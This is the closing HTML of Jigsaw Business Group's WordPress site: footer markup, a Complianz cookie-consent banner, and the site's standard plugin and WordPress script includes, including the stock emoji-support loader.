  <path d="M10.4166 15.6249L15.8228 12.4999L10.4166 9.37492V15.6249ZM22.4583 7.46867C22.5937 7.95825 22.6874 8.6145 22.7499 9.44783C22.8228 10.2812 22.8541 10.9999 22.8541 11.6249L22.9166 12.4999C22.9166 14.7812 22.7499 16.4583 22.4583 17.5312C22.1978 18.4687 21.5937 19.0728 20.6562 19.3333C20.1666 19.4687 19.2708 19.5624 17.8958 19.6249C16.5416 19.6978 15.302 19.7291 14.1562 19.7291L12.4999 19.7916C8.13534 19.7916 5.41659 19.6249 4.34367 19.3333C3.40617 19.0728 2.802 18.4687 2.54159 17.5312C2.40617 17.0416 2.31242 16.3853 2.24992 15.552C2.177 14.7187 2.14575 13.9999 2.14575 13.3749L2.08325 12.4999C2.08325 10.2187 2.24992 8.54159 2.54159 7.46867C2.802 6.53117 3.40617 5.927 4.34367 5.66659C4.83325 5.53117 5.72909 5.43742 7.10409 5.37492C8.45825 5.302 9.69784 5.27075 10.8437 5.27075L12.4999 5.20825C16.8645 5.20825 19.5833 5.37492 20.6562 5.66659C21.5937 5.927 22.1978 6.53117 22.4583 7.46867Z" fill="#00416A"/>
</svg></a>
                        </div>
                    </div>
                    <div class="copyright">© Jigsaw Business Group <span id="year"></span>, All Rights Reserved</div>
                    <div class="built-by">Built By <a href="https://delivermedia.co.uk/" target="_blank">Deliver</a></div>
                </div>
                <div class="registered-office">Registered office 7-8 Delta Bank Road, Metro Riverside Park, Gateshead, NE11 9DJ.</div>
            </div>
        </section>
	</footer><!-- #colophon -->

</div><!-- #page -->


    


<script src="//code.jquery.com/jquery-1.10.2.js"></script>
<script src="//code.jquery.com/ui/1.11.3/jquery-ui.js"></script>
<script type="text/javascript" src="https://www.gstatic.com/charts/loader.js"></script>
<script defer src="https://jigsawbusinessgroup.com/wp-content/themes/jigsaw/js/map.js"></script>
<script>document.getElementById("year").innerHTML = new Date().getFullYear(); </script> 

<script type="speculationrules">
{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"/*"},{"not":{"href_matches":["/wp-*.php","/wp-admin/*","/wp-content/uploads/*","/wp-content/*","/wp-content/plugins/*","/wp-content/themes/jigsaw/*","/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
</script>

<!-- Consent Management powered by Complianz | GDPR/CCPA Cookie Consent https://wordpress.org/plugins/complianz-gdpr -->
<div id="cmplz-cookiebanner-container"><div class="cmplz-cookiebanner cmplz-hidden banner-1 banner-a optin cmplz-center cmplz-categories-type-view-preferences" aria-modal="true" data-nosnippet="true" role="dialog" aria-live="polite" aria-labelledby="cmplz-header-1-optin" aria-describedby="cmplz-message-1-optin">
	<div class="cmplz-header">
		<div class="cmplz-logo"></div>
		<div class="cmplz-title" id="cmplz-header-1-optin">Manage Consent</div>
		<div class="cmplz-close" tabindex="0" role="button" aria-label="Close dialogue">
			<svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="times" class="svg-inline--fa fa-times fa-w-11" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 352 512"><path fill="currentColor" d="M242.72 256l100.07-100.07c12.28-12.28 12.28-32.19 0-44.48l-22.24-22.24c-12.28-12.28-32.19-12.28-44.48 0L176 189.28 75.93 89.21c-12.28-12.28-32.19-12.28-44.48 0L9.21 111.45c-12.28 12.28-12.28 32.19 0 44.48L109.28 256 9.21 356.07c-12.28 12.28-12.28 32.19 0 44.48l22.24 22.24c12.28 12.28 32.2 12.28 44.48 0L176 322.72l100.07 100.07c12.28 12.28 32.2 12.28 44.48 0l22.24-22.24c12.28-12.28 12.28-32.19 0-44.48L242.72 256z"></path></svg>
		</div>
	</div>

	<div class="cmplz-divider cmplz-divider-header"></div>
	<div class="cmplz-body">
		<div class="cmplz-message" id="cmplz-message-1-optin">To provide the best experiences, we use technologies like cookies to store and/or access device information. Consenting to these technologies will allow us to process data such as browsing behaviour or unique IDs on this site. Not consenting or withdrawing consent, may adversely affect certain features and functions.</div>
		<!-- categories start -->
		<div class="cmplz-categories">
			<details class="cmplz-category cmplz-functional" >
				<summary>
						<span class="cmplz-category-header">
							<span class="cmplz-category-title">Functional</span>
							<span class='cmplz-always-active'>
								<span class="cmplz-banner-checkbox">
									<input type="checkbox"
										   id="cmplz-functional-optin"
										   data-category="cmplz_functional"
										   class="cmplz-consent-checkbox cmplz-functional"
										   size="40"
										   value="1"/>
									<label class="cmplz-label" for="cmplz-functional-optin" tabindex="0"><span class="screen-reader-text">Functional</span></label>
								</span>
								Always active							</span>
							<span class="cmplz-icon cmplz-open">
								<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"  height="18" ><path d="M224 416c-8.188 0-16.38-3.125-22.62-9.375l-192-192c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L224 338.8l169.4-169.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-192 192C240.4 412.9 232.2 416 224 416z"/></svg>
							</span>
						</span>
				</summary>
				<div class="cmplz-description">
					<span class="cmplz-description-functional">The technical storage or access is strictly necessary for the legitimate purpose of enabling the use of a specific service explicitly requested by the subscriber or user, or for the sole purpose of carrying out the transmission of a communication over an electronic communications network.</span>
				</div>
			</details>

			<details class="cmplz-category cmplz-preferences" >
				<summary>
						<span class="cmplz-category-header">
							<span class="cmplz-category-title">Preferences</span>
							<span class="cmplz-banner-checkbox">
								<input type="checkbox"
									   id="cmplz-preferences-optin"
									   data-category="cmplz_preferences"
									   class="cmplz-consent-checkbox cmplz-preferences"
									   size="40"
									   value="1"/>
								<label class="cmplz-label" for="cmplz-preferences-optin" tabindex="0"><span class="screen-reader-text">Preferences</span></label>
							</span>
							<span class="cmplz-icon cmplz-open">
								<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"  height="18" ><path d="M224 416c-8.188 0-16.38-3.125-22.62-9.375l-192-192c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L224 338.8l169.4-169.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-192 192C240.4 412.9 232.2 416 224 416z"/></svg>
							</span>
						</span>
				</summary>
				<div class="cmplz-description">
					<span class="cmplz-description-preferences">The technical storage or access is necessary for the legitimate purpose of storing preferences that are not requested by the subscriber or user.</span>
				</div>
			</details>

			<details class="cmplz-category cmplz-statistics" >
				<summary>
						<span class="cmplz-category-header">
							<span class="cmplz-category-title">Statistics</span>
							<span class="cmplz-banner-checkbox">
								<input type="checkbox"
									   id="cmplz-statistics-optin"
									   data-category="cmplz_statistics"
									   class="cmplz-consent-checkbox cmplz-statistics"
									   size="40"
									   value="1"/>
								<label class="cmplz-label" for="cmplz-statistics-optin" tabindex="0"><span class="screen-reader-text">Statistics</span></label>
							</span>
							<span class="cmplz-icon cmplz-open">
								<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"  height="18" ><path d="M224 416c-8.188 0-16.38-3.125-22.62-9.375l-192-192c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L224 338.8l169.4-169.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-192 192C240.4 412.9 232.2 416 224 416z"/></svg>
							</span>
						</span>
				</summary>
				<div class="cmplz-description">
					<span class="cmplz-description-statistics">The technical storage or access that is used exclusively for statistical purposes.</span>
					<span class="cmplz-description-statistics-anonymous">The technical storage or access that is used exclusively for anonymous statistical purposes. Without a subpoena, voluntary compliance on the part of your Internet Service Provider, or additional records from a third party, information stored or retrieved for this purpose alone cannot usually be used to identify you.</span>
				</div>
			</details>
			<details class="cmplz-category cmplz-marketing" >
				<summary>
						<span class="cmplz-category-header">
							<span class="cmplz-category-title">Marketing</span>
							<span class="cmplz-banner-checkbox">
								<input type="checkbox"
									   id="cmplz-marketing-optin"
									   data-category="cmplz_marketing"
									   class="cmplz-consent-checkbox cmplz-marketing"
									   size="40"
									   value="1"/>
								<label class="cmplz-label" for="cmplz-marketing-optin" tabindex="0"><span class="screen-reader-text">Marketing</span></label>
							</span>
							<span class="cmplz-icon cmplz-open">
								<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"  height="18" ><path d="M224 416c-8.188 0-16.38-3.125-22.62-9.375l-192-192c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L224 338.8l169.4-169.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-192 192C240.4 412.9 232.2 416 224 416z"/></svg>
							</span>
						</span>
				</summary>
				<div class="cmplz-description">
					<span class="cmplz-description-marketing">The technical storage or access is required to create user profiles to send advertising, or to track the user on a website or across several websites for similar marketing purposes.</span>
				</div>
			</details>
		</div><!-- categories end -->
			</div>

	<div class="cmplz-links cmplz-information">
		<a class="cmplz-link cmplz-manage-options cookie-statement" href="#" data-relative_url="#cmplz-manage-consent-container">Manage options</a>
		<a class="cmplz-link cmplz-manage-third-parties cookie-statement" href="#" data-relative_url="#cmplz-cookies-overview">Manage services</a>
		<a class="cmplz-link cmplz-manage-vendors tcf cookie-statement" href="#" data-relative_url="#cmplz-tcf-wrapper">Manage {vendor_count} vendors</a>
		<a class="cmplz-link cmplz-external cmplz-read-more-purposes tcf" target="_blank" rel="noopener noreferrer nofollow" href="https://cookiedatabase.org/tcf/purposes/">Read more about these purposes</a>
			</div>

	<div class="cmplz-divider cmplz-footer"></div>

	<div class="cmplz-buttons">
		<button class="cmplz-btn cmplz-accept">Accept</button>
		<button class="cmplz-btn cmplz-deny">Deny</button>
		<button class="cmplz-btn cmplz-view-preferences">View preferences</button>
		<button class="cmplz-btn cmplz-save-preferences">Save preferences</button>
		<a class="cmplz-btn cmplz-manage-options tcf cookie-statement" href="#" data-relative_url="#cmplz-manage-consent-container">View preferences</a>
			</div>

	<div class="cmplz-links cmplz-documents">
		<a class="cmplz-link cookie-statement" href="#" data-relative_url="">{title}</a>
		<a class="cmplz-link privacy-statement" href="#" data-relative_url="">{title}</a>
		<a class="cmplz-link impressum" href="#" data-relative_url="">{title}</a>
			</div>

</div>
</div>
					<div id="cmplz-manage-consent" data-nosnippet="true"><button class="cmplz-btn cmplz-hidden cmplz-manage-consent manage-consent-1">Manage consent</button>

</div><script src="https://jigsawbusinessgroup.com/wp-content/plugins/metronet-profile-picture/js/mpp-frontend.js?ver=2.6.3" id="mpp_gutenberg_tabs-js"></script>
<script src="https://jigsawbusinessgroup.com/wp-content/plugins/contact-form-7/includes/swv/js/index.js?ver=5.9.3" id="swv-js"></script>
<script id="contact-form-7-js-extra">
var wpcf7 = {"api":{"root":"https://jigsawbusinessgroup.com/wp-json/","namespace":"contact-form-7/v1"}};
//# sourceURL=contact-form-7-js-extra
</script>
<script src="https://jigsawbusinessgroup.com/wp-content/plugins/contact-form-7/includes/js/index.js?ver=5.9.3" id="contact-form-7-js"></script>
<script id="wpcf7-redirect-script-js-extra">
var wpcf7r = {"ajax_url":"https://jigsawbusinessgroup.com/wp-admin/admin-ajax.php"};
//# sourceURL=wpcf7-redirect-script-js-extra
</script>
<script src="https://jigsawbusinessgroup.com/wp-content/plugins/wpcf7-redirect/build/js/wpcf7r-fe.js?ver=1.1" id="wpcf7-redirect-script-js"></script>
<script src="https://jigsawbusinessgroup.com/wp-content/themes/jigsaw/js/navigation.js?ver=1.0.0" id="jigsaw-navigation-js"></script>
<script src="https://www.google.com/recaptcha/api.js?render=6LdQ25wpAAAAACXAOz62EvWtXn9Kmi8Bm4Vh0t-2&amp;ver=3.0" id="google-recaptcha-js"></script>
<script src="https://jigsawbusinessgroup.com/wp-includes/js/dist/vendor/wp-polyfill.min.js?ver=3.15.0" id="wp-polyfill-js"></script>
<script id="wpcf7-recaptcha-js-extra">
var wpcf7_recaptcha = {"sitekey":"6LdQ25wpAAAAACXAOz62EvWtXn9Kmi8Bm4Vh0t-2","actions":{"homepage":"homepage","contactform":"contactform"}};
//# sourceURL=wpcf7-recaptcha-js-extra
</script>
<script src="https://jigsawbusinessgroup.com/wp-content/plugins/contact-form-7/modules/recaptcha/index.js?ver=5.9.3" id="wpcf7-recaptcha-js"></script>
<script src="https://jigsawbusinessgroup.com/wp-content/plugins/wp-smushit/app/assets/js/smush-lazy-load.min.js?ver=3.18.0" id="smush-lazy-load-js"></script>
<script id="cmplz-cookiebanner-js-extra">
var complianz = {"prefix":"cmplz_","user_banner_id":"1","set_cookies":[],"block_ajax_content":"","banner_version":"5070","version":"7.0.5","store_consent":"","do_not_track_enabled":"","consenttype":"optin","region":"uk","geoip":"","dismiss_timeout":"","disable_cookiebanner":"","soft_cookiewall":"","dismiss_on_scroll":"","cookie_expiry":"365","url":"https://jigsawbusinessgroup.com/wp-json/complianz/v1/","locale":"lang=en&locale=en_GB","set_cookies_on_root":"","cookie_domain":"","current_policy_id":"34","cookie_path":"/","categories":{"statistics":"statistics","marketing":"marketing"},"tcf_active":"","placeholdertext":"Click to accept {category} cookies and enable this content","css_file":"https://jigsawbusinessgroup.com/wp-content/uploads/complianz/css/banner-{banner_id}-{type}.css?v=5070","page_links":{"uk":{"cookie-statement":{"title":"Cookie Policy","url":"https://jigsawbusinessgroup.com/terms-conditions/#cookies"},"privacy-statement":{"title":"Privacy Statement","url":""}}},"tm_categories":"1","forceEnableStats":"","preview":"","clean_cookies":"","aria_label":"Click to accept {category} cookies and enable this content"};
//# sourceURL=cmplz-cookiebanner-js-extra
</script>
<script defer src="https://jigsawbusinessgroup.com/wp-content/plugins/complianz-gdpr/cookiebanner/js/complianz.min.js?ver=1714488313" id="cmplz-cookiebanner-js"></script>
<script id="wp-emoji-settings" type="application/json">
{"baseUrl":"https://s.w.org/images/core/emoji/17.0.2/72x72/","ext":".png","svgUrl":"https://s.w.org/images/core/emoji/17.0.2/svg/","svgExt":".svg","source":{"concatemoji":"https://jigsawbusinessgroup.com/wp-includes/js/wp-emoji-release.min.js?ver=6.9.1"}}
</script>
<script type="module">
/*! This file is auto-generated */
const a=JSON.parse(document.getElementById("wp-emoji-settings").textContent),o=(window._wpemojiSettings=a,"wpEmojiSettingsSupports"),s=["flag","emoji"];function i(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function c(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data);e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0);const a=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data);return t.every((e,t)=>e===a[t])}function p(e,t){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var n=e.getImageData(16,16,1,1);for(let e=0;e<n.data.length;e++)if(0!==n.data[e])return!1;return!0}function u(e,t,n,a){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\udde8\ud83c\uddf6","\ud83c\udde8\u200b\ud83c\uddf6")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!a(e,"\ud83e\u1fac8")}return!1}function f(e,t,n,a){let r;const o=(r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):document.createElement("canvas")).getContext("2d",{willReadFrequently:!0}),s=(o.textBaseline="top",o.font="600 32px Arial",{});return e.forEach(e=>{s[e]=t(o,e,n,a)}),s}function r(e){var t=document.createElement("script");t.src=e,t.defer=!0,document.head.appendChild(t)}a.supports={everything:!0,everythingExceptFlag:!0},new Promise(t=>{let n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),c.toString(),p.toString()].join(",")+"));",a=new Blob([e],{type:"text/javascript"});const r=new Worker(URL.createObjectURL(a),{name:"wpTestEmojiSupports"});return void(r.onmessage=e=>{i(n=e.data),r.terminate(),t(n)})}catch(e){}i(n=f(s,u,c,p))}t(n)}).then(e=>{for(const n in e)a.supports[n]=e[n],a.supports.everything=a.supports.everything&&a.supports[n],"flag"!==n&&(a.supports.everythingExceptFlag=a.supports.everythingExceptFlag&&a.supports[n]);var t;a.supports.everythingExceptFlag=a.supports.everythingExceptFlag&&!a.supports.flag,a.supports.everything||((t=a.source||{}).concatemoji?r(t.concatemoji):t.wpemoji&&t.twemoji&&(r(t.twemoji),r(t.wpemoji)))});
//# sourceURL=https://jigsawbusinessgroup.com/wp-includes/js/wp-emoji-loader.min.js
</script>

</body>
</html>
